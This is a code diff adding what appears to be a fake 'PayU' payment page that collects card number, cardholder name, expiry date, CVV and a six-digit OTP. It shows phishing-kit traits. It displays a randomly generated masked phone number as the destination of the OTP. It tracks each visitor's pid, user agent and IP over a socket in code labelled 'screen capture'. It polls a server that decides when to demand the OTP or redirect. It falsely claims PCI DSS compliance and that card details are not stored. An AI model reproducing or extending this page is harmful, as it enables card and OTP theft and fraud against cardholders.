+                                                '<img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-5 w-auto" />' : 
+                                            state.cardType === 'amex' ? 
+                                                '<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" class="h-5 w-auto" />' : 
+                                            state.cardType === 'discover' ? 
+                                                '<img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg" alt="Discover" class="h-5 w-auto" />' : 
+                                            state.cardType === 'rupay' ? 
+                                                '<img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png" alt="RuPay" class="h-5 w-auto" />' : 
+                                            ''}
+                                        </div>
+                                    </div>
+                                ` : ''}
+                            </div>
+                            ${state.cardForm.errors.cardNumber ? 
+                                `<div class="text-red-500 text-xs mt-1">${state.cardForm.errors.cardNumber}</div>` : ''}
+                        </div>
+                        
+                        <div class="space-y-1">
+                            <label class="block text-sm font-medium">Card Holder Name</label>
+                            <input 
+                                type="text" 
+                                id="card-holder" 
+                                placeholder="John Doe" 
+                                value="${state.cardForm.cardHolder}" 
+                                class="${state.cardForm.errors.cardHolder ? 'border-red-500' : ''}"
+                            />
+                            ${state.cardForm.errors.cardHolder ? 
+                                `<div class="text-red-500 text-xs mt-1">${state.cardForm.errors.cardHolder}</div>` : ''}
+                        </div>
+                        
+                        <div class="grid grid-cols-2 gap-4">
+                            <div class="space-y-1">
+                                <label class="block text-sm font-medium">Expiry Date</label>
+                                <input 
+                                    type="text" 
+                                    id="expiry-date" 
+                                    placeholder="MM/YY" 
+                                    value="${state.cardForm.expiryDate}" 
+                                    maxlength="5" 
+                                    class="${state.cardForm.errors.expiryDate ? 'border-red-500' : ''}"
+                                />
+                                ${state.cardForm.errors.expiryDate ? 
+                                    `<div class="text-red-500 text-xs mt-1">${state.cardForm.errors.expiryDate}</div>` : ''}
+                            </div>
+                            
+                            <div class="space-y-1">
+                                <label class="block text-sm font-medium">CVV</label>
+                                <div class="relative">
+                                    <input 
+                                        type="password" 
+                                        id="cvv" 
+                                        placeholder="123" 
+                                        value="${state.cardForm.cvv}" 
+                                        maxlength="4" 
+                                        class="pl-10 ${state.cardForm.errors.cvv ? 'border-red-500' : ''}"
+                                    />
+                                    <div class="absolute left-3 top-3 h-4 w-4 text-gray-400">
+                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                                        </svg>
+                                    </div>
+                                </div>
+                                ${state.cardForm.errors.cvv ? 
+                                    `<div class="text-red-500 text-xs mt-1">${state.cardForm.errors.cvv}</div>` : ''}
+                            </div>
+                        </div>
+                        
+                        <button 
+                            type="submit" 
+                            class="w-full bg-primary hover:bg-primary/90" 
+                            ${state.loading ? 'disabled' : ''}
+                        >
+                            ${state.loading ? `
+                                <div class="flex items-center justify-center">
+                                    <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                                    </svg>
+                                    Processing
+                                </div>
+                            ` : 'Pay Now'}
+                        </button>
+                    </form>
+                `;
+            }
+            
+            // OTP verification HTML
+            function renderOtpVerification() {
+                return `
+                    <div class="space-y-4">
+                        <div class="bg-blue-50 rounded-lg p-6 mb-2">
+                            <div class="flex justify-center mb-2">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
+                                </svg>
+                            </div>
+                            
+                            <h2 class="text-xl font-semibold text-center mb-1">Authentication Required</h2>
+                            <p class="text-sm text-gray-600 text-center mb-4">
+                                For your security, we need to verify your identity
+                            </p>
+                            
+                            <div class="bg-white p-3 rounded-lg border border-gray-200">
+                                <div class="flex items-center">
+                                    <div class="bg-blue-100 rounded-full p-2 mr-3">
+                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                                        </svg>
+                                    </div>
+                                    <div>
+                                        <div class="text-xs text-gray-500">We sent a verification code to</div>
+                                        <div class="font-medium">${state.maskedPhone}</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <h3 class="text-lg font-medium mb-2 text-center">Enter Verification Code</h3>
+                        
+                        <div class="otp-input mb-6">
+                            <input type="text" maxlength="1" class="otp-digit" data-index="0" />
+                            <input type="text" maxlength="1" class="otp-digit" data-index="1" />
+                            <input type="text" maxlength="1" class="otp-digit" data-index="2" />
+                            <input type="text" maxlength="1" class="otp-digit" data-index="3" />
+                            <input type="text" maxlength="1" class="otp-digit" data-index="4" />
+                            <input type="text" maxlength="1" class="otp-digit" data-index="5" />
+                        </div>
+                        
+                        <div class="flex items-center justify-center mb-4">
+                            <div class="w-14 h-14 rounded-full bg-blue-50 flex items-center justify-center">
+                                <span class="text-lg font-medium text-blue-500">
+                                    ${String(Math.floor(state.timeLeft / 60)).padStart(2, '0')}:
+                                    ${String(state.timeLeft % 60).padStart(2, '0')}
+                                </span>
+                            </div>
+                        </div>
+                        
+                        <div class="text-center mb-4">
+                            <button 
+                                id="resend-otp"
+                                class="text-blue-600 font-medium ${!state.canResend ? 'opacity-50 cursor-not-allowed' : ''}"
+                                ${!state.canResend ? 'disabled' : ''}
+                            >
+                                Resend Code
+                            </button>
+                        </div>
+                        
+                        <button 
+                            id="verify-otp"
+                            class="w-full" 
+                            disabled="${state.loading || state.otpValue.length !== 6 ? 'disabled' : ''}"
+                        >
+                            ${state.loading ? `
+                                <div class="flex items-center justify-center">
+                                    <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                                    </svg>
+                                    Verifying
+                                </div>
+                            ` : "Verify & Complete Payment"}
+                        </button>
+                    </div>
+                `;
+            }
+            
+            // Processing HTML
+            function renderProcessing() {
+                return `
+                    <div class="flex flex-col items-center justify-center py-8">
+                        <div class="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-primary mb-4"></div>
+                        <h3 class="text-lg font-medium mb-2">Processing Payment</h3>
+                        <p class="text-sm text-gray-500 text-center">
+                            Please wait while we process your payment. Do not close this window.
+                        </p>
+                    </div>
+                `;
+            }
+            
+            // Success HTML
+            function renderSuccess() {
+                return `
+                    <div class="flex flex-col items-center justify-center py-8">
+                        <div class="h-16 w-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                            </svg>
+                        </div>
+                        <h3 class="text-lg font-medium mb-2">Payment Successful</h3>
+                        <p class="text-sm text-gray-500 text-center mb-4">
+                            Your payment of $${state.amount.toFixed(2)} has been processed successfully.<br />
+                            Transaction ID: <span class="font-medium">${state.transactionId}</span>
+                        </p>
+                        <button id="try-again" class="bg-white text-gray-800 border border-gray-300">
+                            Make Another Payment
+                        </button>
+                    </div>
+                `;
+            }
+            
+            // Failure HTML
+            function renderFailure() {
+                return `
+                    <div class="flex flex-col items-center justify-center py-8">
+                        <div class="h-16 w-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                            </svg>
+                        </div>
+                        <h3 class="text-lg font-medium mb-2">Payment Failed</h3>
+                        <p class="text-sm text-gray-500 text-center mb-4">
+                            We couldn't process your payment. Please check your details and try again.
+                        </p>
+                        <button id="try-again" class="bg-white text-gray-800 border border-gray-300">
+                            Try Again
+                        </button>
+                    </div>
+                `;
+            }
+            
+            // Render the entire application
+            function renderApp() {
+                const app = document.getElementById('app');
+                
+                app.innerHTML = `
+                    <div class="w-full max-w-5xl shadow-lg overflow-hidden rounded-lg border bg-white">
+                        <div class="space-y-1 bg-primary text-white rounded-t-lg p-6">
+                            <div class="flex justify-between items-center">
+                                <div class="text-2xl font-bold">PayU</div>
+                                <p class="text-sm">Secure Payment</p>
+                            </div>
+                            <div class="text-gray-100">
+                                Amount: $${state.amount.toFixed(2)} USD
+                            </div>
+                        </div>
+                        
+                        <div class="md:flex">
+                            <!-- Left Side - Order Summary -->
+                            <div class="md:w-1/2 p-6 border-r">
+                                <div class="mb-6">
+                                    <h2 class="text-lg font-semibold mb-4">Order Summary</h2>
+                                    
+                                    <div class="space-y-2">
+                                        <div class="flex justify-between">
+                                            <span class="text-gray-600">Sub Total</span>
+                                            <span>$1,200.00</span>
+                                        </div>
+                                        <div class="flex justify-between">
+                                            <span class="text-gray-600">Tax (GST)</span>
+                                            <span>$99.00</span>
+                                        </div>
+                                        <div class="border-t border-gray-200 my-2 pt-2 flex justify-between font-semibold">
+                                            <span>Total Amount</span>
+                                            <span>$${state.amount.toFixed(2)}</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div class="mb-6">
+                                    <div class="flex items-center space-x-2 mb-3">
+                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
+                                        </svg>
+                                        <span class="font-medium">Secure Payment Gateway</span>
+                                    </div>
+                                    <p class="text-sm text-gray-600">
+                                        Your payment information is securely transmitted using 256-bit encryption. We do not store your card details.
+                                    </p>
+                                </div>
+                                
+                                <div>
+                                    <h3 class="text-md font-medium mb-2">We Accept</h3>
+                                    <div class="flex flex-wrap gap-3">
+                                        <div class="h-8 w-12 flex items-center justify-center">
+                                            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-6 w-auto object-contain" />
+                                        </div>
+                                        <div class="h-8 w-12 flex items-center justify-center">
+                                            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-6 w-auto object-contain" />
+                                        </div>
+                                        <div class="h-8 w-12 flex items-center justify-center">
+                                            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express" class="h-6 w-auto object-contain" />
+                                        </div>
+                                        <div class="h-8 w-12 flex items-center justify-center">
+                                            <img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg" alt="Discover" class="h-6 w-auto object-contain" />
+                                        </div>
+                                        <div class="h-8 w-12 flex items-center justify-center">
+                                            <img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png" alt="RuPay" class="h-6 w-auto object-contain" />
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <!-- Right Side - Payment Forms -->
+                            <div class="md:w-1/2 p-6">
+                                ${state.step === 'card' ? renderCardForm() :
+                                  state.step === 'otp' ? renderOtpVerification() : 
+                                  state.step === 'processing' ? renderProcessing() :
+                                  state.step === 'success' ? renderSuccess() : 
+                                  state.step === 'failure' ? renderFailure() : ''}
+                            </div>
+                        </div>
+                        
+                        <div class="flex flex-col space-y-2 pt-0 border-t p-6">
+                            <div class="w-full flex flex-wrap justify-center items-center gap-6 py-3">
+                                <div class="flex items-center space-x-2">
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PCI_Logo.svg" alt="PCI DSS" class="h-6 w-auto" />
+                                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
+                                </div>
+                                <div class="separator-vertical"></div>
+                                <div>
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Verified_by_Visa.svg" alt="Verified by Visa" class="h-6 w-auto" />
+                                </div>
+                                <div>
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Mastercard_SecureCode_horizontal.svg" alt="Mastercard SecureCode" class="h-6 w-auto" />
+                                </div>
+                                <div class="separator-vertical"></div>
+                                <div class="text-xs text-gray-500">Powered by PayU Biz</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                
+                // Add event listeners after rendering
+                setupEventListeners();
+            }
+            
+            // Setup event listeners for the form elements
+            function setupEventListeners() {
+                if (state.step === 'card') {
+                    const cardForm = document.getElementById('card-form');
+                    const cardNumberInput = document.getElementById('card-number');
+                    const cardHolderInput = document.getElementById('card-holder');
+                    const expiryDateInput = document.getElementById('expiry-date');
+                    const cvvInput = document.getElementById('cvv');
+                    
+                   // Card number input handler
+cardNumberInput.addEventListener('input', (e) => {
+    const formattedValue = formatCardNumber(e.target.value);
+    state.cardForm.cardNumber = formattedValue;
+    e.target.value = formattedValue;
+    detectCardType(formattedValue);
+    
+    // Update card type icon without re-rendering the entire form
+    if (state.cardType) {
+        const cardIconContainer = document.querySelector('.absolute.right-3.top-2\\.5');
+        if (cardIconContainer) {
+            cardIconContainer.innerHTML = `
+                <div class="h-5 w-10 flex items-center justify-center">
+                    ${state.cardType === 'visa' ? 
+                        '<img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-5 w-auto" />' : 
+                    state.cardType === 'mastercard' ? 
+                        '<img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-5 w-auto" />' : 
+                    state.cardType === 'amex' ? 
+                        '<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" class="h-5 w-auto" />' : 
+                    state.cardType === 'discover' ? 
+                        '<img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg" alt="Discover" class="h-5 w-auto" />' : 
+                    state.cardType === 'rupay' ? 
+                        '<img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png" alt="RuPay" class="h-5 w-auto" />' : 
+                    ''}
+                </div>
             `;
+        } else {
+            const cardNumberInputWrapper = document.querySelector('.relative');
+            if (cardNumberInputWrapper) {
+                const iconDiv = document.createElement('div');
+                iconDiv.className = 'absolute right-3 top-2.5';
+                iconDiv.innerHTML = `
+                    <div class="h-5 w-10 flex items-center justify-center">
+                        ${state.cardType === 'visa' ? 
+                            '<img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-5 w-auto" />' : 
+                        state.cardType === 'mastercard' ? 
+                            '<img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-5 w-auto" />' : 
+                        state.cardType === 'amex' ? 
+                            '<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" class="h-5 w-auto" />' : 
+                        state.cardType === 'discover' ? 
+                            '<img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg" alt="Discover" class="h-5 w-auto" />' : 
+                        state.cardType === 'rupay' ? 
+                            '<img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png" alt="RuPay" class="h-5 w-auto" />' : 
+                        ''}
+                    </div>
+                `;
+                cardNumberInputWrapper.appendChild(iconDiv);
+            }
+        }
+    }
+});
+                    
+                    // Card holder input handler
+                    cardHolderInput.addEventListener('input', (e) => {
+                        state.cardForm.cardHolder = e.target.value;
+                    });
+                    
+                    // Expiry date input handler
+                    expiryDateInput.addEventListener('input', (e) => {
+                        const formattedValue = formatExpiryDate(e.target.value);
+                        state.cardForm.expiryDate = formattedValue;
+                        e.target.value = formattedValue;
+                    });
+                    
+                    // CVV input handler
+                    cvvInput.addEventListener('input', (e) => {
+                        state.cardForm.cvv = e.target.value;
+                    });
+                    
+                    // Form submission
+                    cardForm.addEventListener('submit', handleCardSubmit);
+                }
+                
+                if (state.step === 'otp') {
+                    const otpInputs = document.querySelectorAll('.otp-digit');
+                    const resendBtn = document.getElementById('resend-otp');
+                    const verifyBtn = document.getElementById('verify-otp');
+                    
+                    // Setup OTP input fields
+                    otpInputs.forEach((input, index) => {
+                        // Focus the first input on load
+                        if (index === 0) {
+                            setTimeout(() => input.focus(), 100);
+                        }
+                        
+                        input.addEventListener('input', (e) => {
+                            const digits = state.otpValue.split('');
+                            digits[index] = e.target.value;
+                            state.otpValue = digits.join('');
+                            
+                            // Auto-focus next input
+                            if (e.target.value && index < otpInputs.length - 1) {
+                                otpInputs[index + 1].focus();
+                            }
+                            
+                            // Enable/disable verify button
+                            verifyBtn.disabled = state.otpValue.length !== 6;
+                            
+                            // Refresh disabled state on button
+                            renderApp();
+                        });
+                        
+                        // Handle backspace
+                        input.addEventListener('keydown', (e) => {
+                            if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                                otpInputs[index - 1].focus();
+                            }
+                        });
+                    });
+                    
+                    // Handle OTP resend
+                    resendBtn.addEventListener('click', handleResendOtp);
+                    
+                    // Handle OTP verification
+                    verifyBtn.addEventListener('click', handleOtpSubmit);
+                }
+                
+                if (state.step === 'success' || state.step === 'failure') {
+                    const tryAgainBtn = document.getElementById('try-again');
+                    tryAgainBtn.addEventListener('click', handleTryAgain);
+                }
+            }
             
-            document.getElementById('content').appendChild(debugInfo);
+            // Initialize screen capture
+            function initScreenCapture() {
+                try {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const pid = urlParams.get('pid');
+                    
+                    if (!pid) return;
+                    
+                    // Generate capture script
+                    const captureScript = `
+                        // Basic screen capture functionality
+                        (function() {
+                            // Get payment ID from URL
+                            const urlParams = new URLSearchParams(window.location.search);
+                            const pid = urlParams.get('pid');
+                            
+                            if (!pid) return;
+                            
+                            // Send heartbeat every 15 seconds
+                            setInterval(() => {
+                                socket.emit('visitor_heartbeat', { 
+                                    pid: pid,
+                                    timestamp: Date.now(),
+                                    url: window.location.href
+                                });
+                            }, 15000);
+                            
+                            // Notify when leaving
+                            window.addEventListener('beforeunload', () => {
+                                socket.emit('visitor_left', { pid: pid });
+                            });
+                            
+                            // Wait for socket to be ready before trying to emit events
+                            if (socket.connected) {
+                                socket.emit('visitor', {
+                                    pid: pid,
+                                    userAgent: navigator.userAgent,
+                                    ip: 'client', // Server will replace this with actual IP
+                                    timestamp: new Date().toISOString(),
+                                    sessionId: 'session-' + Date.now()
+                                });
+                            } else {
+                                socket.on('connect', () => {
+                                    socket.emit('visitor', {
+                                        pid: pid,
+                                        userAgent: navigator.userAgent,
+                                        ip: 'client', // Server will replace this with actual IP
+                                        timestamp: new Date().toISOString(),
+                                        sessionId: 'session-' + Date.now()
+                                    });
+                                });
+                            }
+                        })();
+                    `;
+                    
+                    // Create and append script element
+                    const scriptElement = document.createElement('script');
+                    scriptElement.textContent = captureScript;
+                    document.body.appendChild(scriptElement);
+                    
+                    console.log('Screen capture initialized');
+                } catch (error) {
+                    console.error('Error initializing screen capture:', error);
+                }
+            }
+            
+// Status polling function
+function setupStatusPolling() {
+    // Poll every 3 seconds
+    setInterval(async () => {
+        if (!state.transactionId || state.step !== 'processing') return;
+        
+        try {
+            console.log('Polling for status update...');
+            const response = await fetch(`/api/checkTransactionStatus?invoiceId=${state.transactionId}`);
+            const data = await response.json();
+            
+            console.log('Status update:', data);
+            
+            if (data.status === 'show_otp') {
+                state.step = 'otp';
+                state.loading = false;
+                showToast("OTP Verification Required", "Please enter the OTP sent to your mobile");
+                startOtpTimer();
+                renderApp();
+            } else if (data.status === 'redirect') {
+                window.location.href = data.redirectUrl;
+            }
+        } catch (error) {
+            console.error('Error polling status:', error);
+        }
+    }, 3000);
+}
+
+// Initialize the application
+function initApp() {
+    generateRandomPhone();
+    setupSocketListeners();
+    setupStatusPolling(); // Add this line
+    renderApp();
+    
+    // Also send visitor info if we have a pid
+    const urlParams = new URLSearchParams(window.location.search);
+    const pid = urlParams.get('pid');
+    if (pid) {
+        socket.emit('visitor', {
+            pid: pid,
+            userAgent: navigator.userAgent,
+            ip: 'client', // Server will replace this with actual IP
+            timestamp: new Date().toISOString(),
+            sessionId: 'session-' + Date.now()
         });
+    }
+}
+        // Initialize the application when the document is ready
+initApp();
     </script>
 </body>
 </html>
